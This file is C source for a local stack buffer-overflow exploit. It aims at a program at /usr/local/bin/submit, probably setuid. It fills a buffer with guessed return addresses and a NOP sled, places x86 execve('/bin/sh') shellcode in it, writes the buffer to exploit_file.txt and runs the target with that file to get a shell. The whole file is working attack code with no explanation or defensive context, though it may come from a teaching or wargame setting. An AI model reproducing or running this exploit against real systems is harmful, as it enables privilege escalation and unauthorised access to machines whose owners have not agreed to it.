#include <stdlib.h>
#include <stdio.h>

#define DEFAULT_OFFSET                 1500
#define DEFAULT_SHIFT                    26
#define DEFAULT_BUFFER_SIZE            2060
#define NOP                            0x90
#define TARGET      "/usr/local/bin/submit"
#define EXPLOIT_FILE     "exploit_file.txt"

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  FILE *exploit_file;
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;
  char *args[3];
  char *env[1];

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2)) - DEFAULT_SHIFT;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  exploit_file = fopen(EXPLOIT_FILE, "w+");
  fwrite(buff, 1, bsize, exploit_file);
  fclose(exploit_file);

  args[0] = TARGET;
  args[1] = EXPLOIT_FILE;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  exit(0);
}
